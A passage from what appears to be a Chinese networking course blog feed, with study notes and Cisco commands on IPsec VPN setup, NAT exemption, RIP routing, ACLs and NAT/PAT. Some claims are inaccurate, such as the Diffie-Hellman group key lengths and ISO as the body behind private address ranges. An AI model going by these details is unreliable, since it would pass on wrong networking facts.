id="五、IPsecVPN工作原理"><a href="#五、IPsecVPN工作原理" class="headerlink" title="五、IPsecVPN工作原理"></a>五、IPsecVPN工作原理</h3><h4 id="建立IPsecVPN隧道"><a href="#建立IPsecVPN隧道" class="headerlink" title="建立IPsecVPN隧道"></a>建立IPsecVPN隧道</h4><p><u>① 利用ACL表定义保护的VPN流量触发条件</u></p><p> 如：北京内部：192.168.1.0/24 上海内部：172.16.1.0/24</p><p>则：需要定义源：192.168.1.0/24 —- 目标：172.16.1.0/24</p><p>定义流量触发：也就是定义要保护的流量！</p><p><u>② 利用IKE密钥交换协议建立IKE交换通道管理连接（利用非对称加密算法同步双方对称密钥）：</u></p><p>利用非对称加密算法形成信任的加密通道，此阶段主要工作是形成可信的信道，获得可信信道的非对称加密算法的资源：对方的公钥。然后使用这个可信信道的公钥对<u>对称密钥</u>进行加密传输，这样对方也安全的获得了对称加密的密钥。</p><p><u>③ 利用对称加密算法进行数据传输：</u></p><p>使用对称加密算法+预共享密钥+Hash算法（对称加密后的数据+加上预共享密钥生成指纹）传输数据即可。当非对称加密算法的公钥过期后，需要回到②重新获得。</p><h3 id="六、IPsecVPN命令与实现"><a href="#六、IPsecVPN命令与实现" class="headerlink" title="六、IPsecVPN命令与实现"></a>六、IPsecVPN命令与实现</h3><p><u>① 利用ACL表定义保护的VPN流量触发条件</u></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conf t</span><br><span class="line">access-list 100 permit ip 192.168.1.0 0.0.0.255 172.16.1.0 0.0.0.255</span><br><span class="line">#如果需要配置多个隧道，则再创建一个流量保护ACL表</span><br></pre></td></tr></table></figure><p><u>②利用非对称加密算法安全交换双方对称密钥阶段： 利用IKE密钥交换协议建立IKE交换通道管理连接与交换密钥，两方的路由器会匹配双方的IKE策略集。：</u></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">conf t</span><br><span class="line">crypto isakmp policy IKE策略集名            #创建IKE(Internet Key Exchange)密钥交换协议策略集,集名为1（规范加密算法、Hash加密算法、DH算法、身份认证方法、（存活时间））</span><br><span class="line">    encryption des&#x2F;3des&#x2F;aes        #加密算法（双方必须一致）</span><br><span class="line">    hash md5&#x2F;sha                #哈希算法（完整性）双方必须一致</span><br><span class="line">    group 1&#x2F;2&#x2F;5                    #DH算法（group公钥和私钥的长度：128&#x2F;256&#x2F;512）（机密性）双方必须一致</span><br><span class="line">    authentication pre-share    #设置身份认证的方法为（身份验证）预共享</span><br><span class="line">    exit</span><br><span class="line">crypto isakmp key 预共享密钥 address 对方的公网IP地址 #设置预共享的密钥（ESP隧道模式重新封装技术，防止私有地址的包被互联网丢弃） </span><br><span class="line">#如果需要配置多个隧道，且隧道IKE策略集相同，则只需多加一条：</span><br><span class="line">    crypto isakmp key 预共享密钥 address 对方的公网IP地址</span><br><span class="line">#show crypto isakmp sa 查看隧道状态</span><br></pre></td></tr></table></figure><p><u>③设置对称加密算法进行数据传输的加密方案：</u></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cryto ipsec transform-set 加密方案名 esp-des&#x2F;3des&#x2F;aes（传输数据用到的对称加密算法） esp-(md5&#x2F;sha)-hmac #设置数据传输的方案（加-hmac开启身份验证）</span><br><span class="line">#show crypto ipsec sa 查看隧道状态</span><br></pre></td></tr></table></figure><p><u>④定义一个Map映射表（将数据传输的ACL、加密方案以及数据传送目标的公网IP绑定）：</u></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">crypto map map表名 map表顺序号（隧道号） ipsec-isakmp</span><br><span class="line">    match address ACL表名 #匹配VPN流量触发的ACL表</span><br><span class="line">    set transform-set 加密方案名</span><br><span class="line">    set peer 对方的公网IP地址</span><br><span class="line">    exit</span><br><span class="line">#如果需要配置多个隧道，且方案相同只需要再新写多个Map表，新的隧道号。（表名要相同！）</span><br></pre></td></tr></table></figure><p><u>⑤将Map映射表应用到外网端口上，使IPsecVPN生效。</u></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int f0&#x2F;1（注意f0&#x2F;1必须是外网端口）</span><br><span class="line">crypto map map表名</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><h3 id="七、NAT的豁免技术"><a href="#七、NAT的豁免技术" class="headerlink" title="七、NAT的豁免技术"></a>七、NAT的豁免技术</h3><p><strong>豁免技术解决的问题</strong>：国际标准组织规定路由器工作的优先级：路由 -》 NAT -》 VPN，所以如果公司路由器同时配置了IPsecVPN和NAT，路由器在做完路由将数据包送到端口后，会<u>先进行NAT地址转换</u>，然后进行VPN的ACL表匹配，这样由于NAT后得到的都是公网地址，因此就会产生<u>无法对源IP是私有地址的VPN保护流量ACL表正确匹配</u>的问题。因此，为了解决这个问题，就可以在NAT的ACL表(要使用扩展ACL)中的开头deny所有VPN的保护流量，<u>防止/豁免对这部分保护流量进行NAT源地址转换即可</u>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">acc 101 deny ip 192.168.1.0 0.0.0.255 172.16.1.0 0.0.0.255</span><br><span class="line">acc 101 permit ip 192.168.1.0 0.0.0.255 any</span><br><span class="line">ip nat inside source list 101 int f0&#x2F;1 overload</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/U8rKbR"><img src="https://s1.ax1x.com/2020/07/12/U8rKbR.png" alt="U8rKbR.png"></a></p><h3 id="八、作业"><a href="#八、作业" class="headerlink" title="八、作业"></a>八、作业</h3><p>1、IPsecVPN点到点私网通信</p><p><a href="https://imgchr.com/i/U3Tncn"><img src="https://s1.ax1x.com/2020/07/12/U3Tncn.png" alt="U3Tncn.png"></a></p><p>2、NAT豁免技术</p><p><a href="https://imgchr.com/i/UJcZYn"><img src="https://s1.ax1x.com/2020/07/13/UJcZYn.png" alt="UJcZYn.png"></a></p><p>3、IPsecVPN点到多点配置，同时做豁免</p><p><a href="https://imgchr.com/i/UJcAoj"><img src="https://s1.ax1x.com/2020/07/13/UJcAoj.png" alt="UJcAoj.png"></a></p><p>3、</p>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态路由</title>
      <link href="/2020/07/11/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/25%E3%80%81%E5%8A%A8%E6%80%81%E8%B7%AF%E7%94%B1/"/>
      <url>/2020/07/11/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/25%E3%80%81%E5%8A%A8%E6%80%81%E8%B7%AF%E7%94%B1/</url>
      
        <content type="html"><![CDATA[<h2 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h2><h3 id="一、动态路由概述"><a href="#一、动态路由概述" class="headerlink" title="一、动态路由概述"></a>一、动态路由概述</h3><p>动态路由可以实现路由器之间动态的互相学习路由表，而不需要工程师手工写路由。</p><h3 id="二、动态路由协议概述"><a href="#二、动态路由协议概述" class="headerlink" title="二、动态路由协议概述"></a>二、动态路由协议概述</h3><p>所谓动态路由就是基于一种动态路由协议实现的。</p><p><strong>动态路由协议</strong>：路由器之间的能够自动协商计算并学习的一种语言或规则。 </p><h3 id="三、动态路由特点"><a href="#三、动态路由特点" class="headerlink" title="三、动态路由特点"></a>三、动态路由特点</h3><p><strong>优点：</strong></p><p>1、减少了管理任务（不需要人工去配置路由表了）。</p><p>2、能够及时适应网络拓扑的变化。</p><p><strong>缺点：</strong></p><p>1、占用设备资源、带宽，降低网络效率。</p><p>2、不稳定，依赖于网络条件。静态路由很稳定。</p><h4 id="四、静态路由与动态路由的适用场景"><a href="#四、静态路由与动态路由的适用场景" class="headerlink" title="四、静态路由与动态路由的适用场景"></a>四、静态路由与动态路由的适用场景</h4><p><strong>1、静态路由</strong>：网络不复杂、且网络拓扑不经常改变，强烈建议使用静态路由。</p><p><strong>2、动态路由</strong>：极其复杂的网络，且网络拓扑日新月异，强烈建议使用动态路由！如联通、电信、移动等运营商。</p><p><strong>3、动静结合</strong>：稍微复杂的网络。</p><h3 id="五、动态路由协议"><a href="#五、动态路由协议" class="headerlink" title="五、动态路由协议"></a>五、动态路由协议</h3><p><strong>度量值</strong>：路由器来衡量到达目标网段远近或方向的标准。</p><p>动态路由协议一般通过度量值的比较来学习路由条目。</p><h3 id="六、动态路由协议的分类"><a href="#六、动态路由协议的分类" class="headerlink" title="六、动态路由协议的分类"></a>六、动态路由协议的分类</h3><p><strong>1、距离矢量路由协议：</strong>以跳数为度量值的协议，称为距离矢量路由协议。</p><p>例子：RIP路由协议、IGRP思科私有的路由协议。</p><p><strong>2、链路状态路由协议：</strong> 以带宽、成本作为度量值的协议，称为链路状态路由协议。</p><p>例子：OSPF路由协议、IS-IS协议等。</p><p><strong>3、BGP协议</strong>：运营商常用的协议。</p><h3 id="七、RIP路由协议-距离矢量协议"><a href="#七、RIP路由协议-距离矢量协议" class="headerlink" title="七、RIP路由协议(距离矢量协议)"></a>七、RIP路由协议(距离矢量协议)</h3><p><strong>RIP协议的度量值</strong>：跳数。</p><p><strong>定期更新时间</strong>：30s，RIP路由协议规定每隔30秒钟会将自己的整张路由表广播出去给自己的邻居们。（邻居学习的跳数最大学习到15跳，超过15跳的不学习。）</p><p><strong>限制</strong>：如果公司的网络拓扑非常稳定，不建议使用动态路由。</p><p><a href="https://imgchr.com/i/UlZFVU"><img src="https://s1.ax1x.com/2020/07/11/UlZFVU.png" alt="UlZFVU.png"></a></p><p><strong>RIP路由条目的的管理距离值</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C &#x3D; 0</span><br><span class="line">S &#x3D; 1</span><br><span class="line">OSPF &#x3D; 110   #链路状态路由协议</span><br><span class="line">RIP &#x3D; 120    #距离矢量路由协议</span><br><span class="line">S* &#x3D; 无穷大</span><br></pre></td></tr></table></figure><h3 id="八、RIP命令与配置"><a href="#八、RIP命令与配置" class="headerlink" title="八、RIP命令与配置"></a>八、RIP命令与配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">conf t    </span><br><span class="line">router rip&#x2F;ospf&#x2F;is-is(动态路由协议)          #开启协议</span><br><span class="line">(config-router)： version 2               #选择一个协议版本</span><br><span class="line">(config-router)： no auto-summary         #关闭自动汇总功能，不会根据IP的类型而默认写入子网掩码，而是明确的学习别的路由器中的路由条目的子网掩码</span><br><span class="line">(config-router)： network 192.168.2.0(该接口网段)    #开启该网段所在端口的RIP协议    ，开启后可以学习也可以发送自身的表(路由器所有端口都要开) &#x2F; 官方术语：开启网段。</span><br><span class="line">no router 动态路由协议                         #删除动态路由的配置</span><br></pre></td></tr></table></figure><h3 id="九、作业"><a href="#九、作业" class="headerlink" title="九、作业"></a>九、作业</h3><p>要求：配置rip路由，并实现全网互通，但此时不要增加5.0网段</p><p>当网络互通后，再增加5.0网段，并保证继续全网互通！</p><p><a href="https://imgchr.com/i/UlWVxO"><img src="https://s1.ax1x.com/2020/07/11/UlWVxO.png" alt="UlWVxO.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三层设备的ACL访问控制列表</title>
      <link href="/2020/07/09/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/24%E3%80%81ACL%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8/"/>
      <url>/2020/07/09/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/24%E3%80%81ACL%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="24、ACL访问控制列表"><a href="#24、ACL访问控制列表" class="headerlink" title="24、ACL访问控制列表"></a>24、ACL访问控制列表</h2><h3 id="一、ACL概述"><a href="#一、ACL概述" class="headerlink" title="一、ACL概述"></a>一、ACL概述</h3><p><strong>1、ACL全称</strong></p><p>Access Control List == 访问控制列表</p><p><strong>2、什么是ACL</strong></p><p>ACL是一种数据<u><strong>包</strong></u>过滤技术。</p><p><strong>3、ACL的应用场景</strong></p><p><u>路由器</u>：就叫ACL技术，一般基于源IP、端口、协议等对数据包进行过滤。（传输层、网络层）</p><p><u>防火墙</u>：一般不叫ACL，称为策略。一般基于源IP、端口、协议、应用层的数据等对数据包进行过滤。（传输层、网络层、应用层）</p><h3 id="二、ACL的分类"><a href="#二、ACL的分类" class="headerlink" title="二、ACL的分类"></a>二、ACL的分类</h3><p><strong>1、标准ACL</strong></p><p>标准–Standard</p><p><u>表号</u>：1-99或1300-1999</p><p>特点：只能基于源IP地址对包进行过滤。</p><p><strong>2、扩展ACL</strong></p><p>扩展–Extended</p><p><u>表号</u>：100-199或2000-2699</p><p>特点：可以基于源IP地址(必写)、目标IP地址(必写)、目标端口号、协议等对包进行过滤。</p><h3 id="三、ACL的过滤原理"><a href="#三、ACL的过滤原理" class="headerlink" title="三、ACL的过滤原理"></a>三、ACL的过滤原理</h3><h4 id="1、ACL的原理"><a href="#1、ACL的原理" class="headerlink" title="1、ACL的原理"></a>1、ACL的原理</h4><p><strong>ACL表</strong>：条件和动作，表中每一条记录从10的倍数开始记录，猜测是方便后期维护，插入记录等。<br><strong>一个接口有2个方向</strong>：in和out，ACL表必须应用到接口的某一方向才能生效。一个接口的1个方向只能生效一张表。</p><p><strong>ACL匹配优先级</strong>：ACL表从上至下匹配，如匹配成功某一条，则直接去执行对应的动作。如果都没匹配到，直接丢弃，如果是ICMP返回主机不可达！（因为在所有的ACL表中，最后永远有一条默认的隐藏的“拒绝所有”条目！所以一般最后一条要写一个any条件 和 permit，防止路由器直接”拒绝所有“把包丢弃。）</p><p><strong>默认不可修改表中某一条记录，但ACL可以使用ACL命名模式的操作完成</strong>：默认情况下，一张ACL表一旦创建后，不能删除某一条，也不能往中间插入新的条目，只能继续在表的后方继续追加新的条目！（如果用no命令尝试删除表中某一条目，会发现整个表都被删除了），<u>但可以通过<strong>ACL命名方式</strong>进行插入，删除表中某条记录的操作。</u></p><h4 id="2、ACL原理讲解过程图"><a href="#2、ACL原理讲解过程图" class="headerlink" title="2、ACL原理讲解过程图"></a>2、ACL原理讲解过程图</h4><h4 id="3、ACL配置小技巧"><a href="#3、ACL配置小技巧" class="headerlink" title="3、ACL配置小技巧"></a>3、ACL配置小技巧</h4><p><strong>1)先分析你要控制的数据流向</strong>，进而判断ACL表应该写在哪台路由器的哪个接口上的哪个方向。如果使用<u>标准ACL</u>控制过滤流量，必须写在靠近目标端的端口。</p><p><strong>2）配置路由器上的ACL表</strong></p><p><strong>3）将ACL表应用到路由器的某个接口上</strong></p><h3 id="四、ACL命令"><a href="#四、ACL命令" class="headerlink" title="四、ACL命令"></a>四、ACL命令</h3><p><strong>1、标准ACL表创建与逐条增加表项命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">conf t</span><br><span class="line">access-list 表号 permit&#x2F;deny   条件</span><br><span class="line">如：</span><br><span class="line">access-list   1   deny   192.168.1.0   0.0.0.255</span><br></pre></td></tr></table></figure><blockquote><p>注释：</p><p>表号：1-99</p><p>条件：源IP 反子网掩码</p><p>反子网掩码：0.0.0.255 0代表严格匹配 255代表不需要匹配</p></blockquote><p>厂商支持简写：</p><p>access-list  1 deny 0.0.0.0 255.255.255.255  =&gt; access-list 1 deny any</p><p>access-list 1 deny 192.168.1.88 0.0.0.0 =&gt; access-list 1 deny host 192.168.1.88</p><p><strong>2、扩展ACL表创建与逐条增加表项命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conf t</span><br><span class="line">access-list 表号 permit&#x2F;deny 协议 源IP 反子网掩码 目标IP 反子网掩码 [eq 端口号]</span><br></pre></td></tr></table></figure><blockquote><p>表号：100-199</p><p>协议：TCP/UDP/IP/ICMP</p></blockquote><p>例子：</p><p><a href="https://imgchr.com/i/UuWRMj"><img src="https://s1.ax1x.com/2020/07/10/UuWRMj.png" alt="UuWRMj.png"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">access-list 100 permit TCP   0.0.0.0 255.255.255.255   70.1.1.100 0.0.0.0   </span><br><span class="line">eq 80 </span><br><span class="line">access-list 100 deny   IP   0.0.0.0   255.255.255.255   70.1.1.100 0.0.0.0</span><br><span class="line">access-list 100 permit IP   0.0.0.0   255.255.255.255 0.0.0.0 </span><br><span class="line">255.255.255.255</span><br><span class="line">简化后的写法:</span><br><span class="line">access-list 100 permit TCP     any   host 70.1.1.100   eq 80 </span><br><span class="line">access-list 100 deny   IP     any   host 70.1.1.100</span><br><span class="line">access-list 100 permit IP     any   any</span><br></pre></td></tr></table></figure><p><strong>3、创建、逐条增加、插入、删除命名ACL表（此模式把表名改成表号同样适用）</strong></p><p>不通过ACL表号区分标准和扩展表，通过指定standard和extended的方法表明，并且可以将表名命名为任意字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">conf t</span><br><span class="line">ip access-list standard&#x2F;extended（表类型） 自定义表名    #创建表</span><br><span class="line">ACL命名模式： permit&#x2F;deny [协议] 源IP 反子网掩码 [目标IP 反子网掩码 eq 端口号]   #逐条增加</span><br><span class="line">ACL命名模式：表项号(比如11) permit&#x2F;deny [协议] 源IP 反子网掩码 [目标IP 反子网掩码 eq 端口号]                                                   #插入某条ACL表项到表项号位置</span><br><span class="line">ACL命名模式：no 表项号                                      #删除某个表项</span><br></pre></td></tr></table></figure><p><strong>4、删除ACL表或者删除某一条记录</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">conf t </span><br><span class="line">no access-list   表号 #删表</span><br><span class="line">ip access-list standard&#x2F;extended（表类型） 表号</span><br><span class="line">ACL命名模式：no 表项号             #删除某个表项</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>5、将ACL表应用到接口的某个方向</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int f0&#x2F;1</span><br><span class="line">ip   access-group   表号   in&#x2F;out</span><br><span class="line">ip   access-group   表名   in&#x2F;out</span><br></pre></td></tr></table></figure><p><strong>6、查看ACL配置</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show   run</span><br><span class="line">show   ip access-list</span><br></pre></td></tr></table></figure><h3 id="五、作业"><a href="#五、作业" class="headerlink" title="五、作业"></a>五、作业</h3><p>1、</p><p><a href="https://imgchr.com/i/UuIyvD"><img src="https://s1.ax1x.com/2020/07/10/UuIyvD.png" alt="UuIyvD.png"></a></p><p><a href="https://imgchr.com/i/UuqdVe"><img src="https://s1.ax1x.com/2020/07/10/UuqdVe.png" alt="UuqdVe.png"></a></p><p>2、首先，先将一下网络搞通！然后按照需求配置ACL完成流量过滤</p><p><a href="https://imgchr.com/i/UMDKbT"><img src="https://s1.ax1x.com/2020/07/10/UMDKbT.png" alt="UMDKbT.png"></a></p><blockquote><p>注意：当某VLAN的ACL最后是拒绝所有，一定要放行67 68，以便可以让该VLAN的PC依然可以自动获取IP地址</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NAT网络地址转换技术</title>
      <link href="/2020/07/08/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/23%E3%80%81NAT/"/>
      <url>/2020/07/08/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/23%E3%80%81NAT/</url>
      
        <content type="html"><![CDATA[<h2 id="NAT网络地址转换技术"><a href="#NAT网络地址转换技术" class="headerlink" title="NAT网络地址转换技术"></a>NAT网络地址转换技术</h2><h3 id="一、NAT概述"><a href="#一、NAT概述" class="headerlink" title="一、NAT概述"></a>一、NAT概述</h3><p>Network Address Translations == 网络地址转换</p><p>NAT作用：NAT就是做内外网地址的转换。</p><blockquote><p>内网 -》 外网： 先路由 再 NAT 进行源转换。</p><p>外网 -》 内网： 先NAT目标转换 -》 再路由。（因为NAT转换在路由器的外网端口上）</p></blockquote><h3 id="二、为什么要学习NAT技术？"><a href="#二、为什么要学习NAT技术？" class="headerlink" title="二、为什么要学习NAT技术？"></a>二、为什么要学习NAT技术？</h3><blockquote><p><strong>答案：由于IPV4地址数量严重不足，ISO对IPV4进行分类，划清私有公有IP地址后，内网如果想要上网就需要在路由器的外网端口使用NAT技术将私有IP转换成公有IP，使用PAT技术可以使内网中的多用户只使用一个公网IP就可以上网。</strong></p></blockquote><p>IPV6地址绝对够用，号称世界上每一粒沙尘都可以有IP地址。但IPV6普及很难。</p><p><strong>ISO组织将IPV4地址进行了分类</strong></p><p><u>1）私有IP地址</u>：私有IP地址只能在内网使用，禁止出现在公网上，且不同的内网可以重复使用！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">10.0.0.0&#x2F;8</span><br><span class="line"></span><br><span class="line">172.16.0.0&#x2F;16 --- 172.31.0.0&#x2F;16</span><br><span class="line"></span><br><span class="line">192.168.0.0&#x2F;16</span><br></pre></td></tr></table></figure><p><u>2）公网IP地址</u>：公网IP地址是在互联网中可以出现的IP地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">除私有IP外，全是公网IP地址。</span><br></pre></td></tr></table></figure><hr><h3 id="三、NAT技术类型"><a href="#三、NAT技术类型" class="headerlink" title="三、NAT技术类型"></a>三、NAT技术类型</h3><h4 id="1、静态NAT技术"><a href="#1、静态NAT技术" class="headerlink" title="1、静态NAT技术"></a>1、静态NAT技术</h4><p>静态配置NAT地址转换表，表内记录由内网IP和公网IP组成，内网IP和公网IP一对一转换，如果设置overload则进行端口映射。</p><p><u>缺点</u>：1对1，多少人要访问外网，就需要多少个公网IP，昂贵，且手动配置，麻烦。</p><h4 id="2、动态NAT技术（已淘汰）"><a href="#2、动态NAT技术（已淘汰）" class="headerlink" title="2、动态NAT技术（已淘汰）"></a>2、动态NAT技术（已淘汰）</h4><h4 id="3、动态PAT技术（地址与端口的转换，最常用）"><a href="#3、动态PAT技术（地址与端口的转换，最常用）" class="headerlink" title="3、动态PAT技术（地址与端口的转换，最常用）"></a>3、动态PAT技术（地址与端口的转换，最常用）</h4><p>动态PAT技术：Port Address Translation</p><p><u>优点</u>：实现内网多个人同时使用1个公网IP地址连接互联网，通过PAT巧妙的“IP和端口同时转换”技术。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1、数据包到达路由器外网端口 -》 </span><br><span class="line"></span><br><span class="line">2、查看NAT地址转换表是否有该IP和端口 -》</span><br><span class="line"></span><br><span class="line">3、如果没有则按照PAT地址池的私有IP转换条件将映射成地址池中的公有IP， 如不满足转换条件则停止地址转换直接送出外网自生自灭（这个处理NAT的路由器外网端口不会丢弃，但外网会丢弃） -》 </span><br><span class="line"></span><br><span class="line">4、将获得的公有IP、原来的私有IP、源端口号存入NAT地址转换表中，并且生成一个唯一的key值作为数据包的源端口号发出  -》 </span><br><span class="line"></span><br><span class="line">5、当该外网端口收到数据包时，通过数据包中的目标端口号和目标IP去NAT地址转换表中进行匹配 -》 </span><br><span class="line"></span><br><span class="line">6、匹配成功后将数据包中的目标IP改为表中的私有IP、 将目标端口号改为表中的真正的端口 -》 </span><br><span class="line"></span><br><span class="line">7、将数据包发送到路由器内网端口进行转发</span><br><span class="line"></span><br><span class="line">注：客户机上与外网联络的端口程序如果关闭，60s后PAT表内该IP的端口记录删除。</span><br></pre></td></tr></table></figure><p><strong>限制</strong>：该技术是有限制的，当生成的端口key值超过了端口号的范围65535，则无法继续进行地址转换。一般来说一个人正常使用端口再10-30左右，所以一个地址足够2000人使用了。如果不够，则再买个公网IP扯条网线供PAT映射即可。</p><p><a href="https://imgchr.com/i/UZdnyj"><img src="https://s1.ax1x.com/2020/07/08/UZdnyj.png" alt="UZdnyj.png"></a></p><blockquote><p><strong>此图下部分的图应该不是很准确，左边的池子不是NAT地址池应该称为内网允许地址转换的ACL表，右边才是应该定义的nat pool</strong></p></blockquote><h3 id="四、PAT命令"><a href="#四、PAT命令" class="headerlink" title="四、PAT命令"></a>四、PAT命令</h3><blockquote><p>部分参考百度链接：<a href="https://wenku.baidu.com/view/3917c0425901020206409c30.html">https://wenku.baidu.com/view/3917c0425901020206409c30.html</a></p></blockquote><p>1、指定NAT内网端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int f0&#x2F;0</span><br><span class="line">ip nat inside</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>2、指定NAT外网端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int f0&#x2F;1</span><br><span class="line">ip nat outside</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>3、创建NAT内部地址池，以及定义允许哪些内网IP进行NAT的ACL表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conf t</span><br><span class="line">access-list ACL号 permit 内网允许NAT的网段 反掩码 &#x2F;&#x2F;（注释是百度）定义可以进行NAT转换的内网（ACL）</span><br><span class="line"># ip nat 地址池名 公网可用的地址池的起始IP 终止IP netmask 子网掩码 &#x2F;&#x2F;百度：定义地址池名字以及地址、终止IP地址和子网掩码，如配置地址池要放在access之前</span><br></pre></td></tr></table></figure><p>4、做动态PAT映射</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conf t</span><br><span class="line">ip nat inside source list ACL号 interface f0&#x2F;1(外网端口) overload（端口转换）&#x2F;&#x2F;这种方式是直接定义外网的地址为f0&#x2F;1外网端口的地址，如果有想映射多个外网地址的时候，需要在第三步创建一个nat地址池 </span><br><span class="line"># ip nat inside source list ACL号 pool 地址池名 overload（端口转换）  &#x2F;&#x2F;将ACL列表与NAT的地址池进行绑定并复用</span><br></pre></td></tr></table></figure><p>overload的意思就是复用，这个作用就是使用一个地址可以重复使用（用端口号进行区分）</p><h3 id="五、端口映射——静态NAT技术"><a href="#五、端口映射——静态NAT技术" class="headerlink" title="五、端口映射——静态NAT技术"></a>五、端口映射——静态NAT技术</h3><blockquote><p><strong>通过静态NAT技术，可以使内网的IP和端口映射到外网的IP和端口，使外网访问内网的资源与通信。</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conf t </span><br><span class="line">ip nat inside source static 连接方式（tcp&#x2F;udp） 内网IP地址 内网IP的端口 外网IP 